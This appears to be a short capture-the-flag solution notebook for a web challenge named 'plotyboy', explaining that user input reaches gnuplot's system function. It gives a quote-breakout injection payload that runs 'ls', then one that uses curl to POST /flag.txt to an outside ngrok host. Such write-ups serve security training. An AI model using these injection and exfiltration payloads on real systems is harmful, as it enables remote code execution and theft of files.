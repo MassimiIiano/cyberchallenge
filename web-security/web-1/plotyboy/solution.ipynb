{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# plotyboy\n",
    "\n",
    "you can inject python code in th website\n",
    "\n",
    "the website user gunicorn witch intern uses gnuplot to plot the graph.\n",
    "gnuplot has a vulnerability that allows to execute arbitrary code.\n",
    "the `system` function is used to execute the code.\n",
    "\n",
    "```txt\n",
    "x**2' system(\"ls\")\n",
    "```"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "x**2' system \"curl -X POST -F 'file=@/flag.txt' https://3aa6-46-18-27-4.ngrok-free.app)\""
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
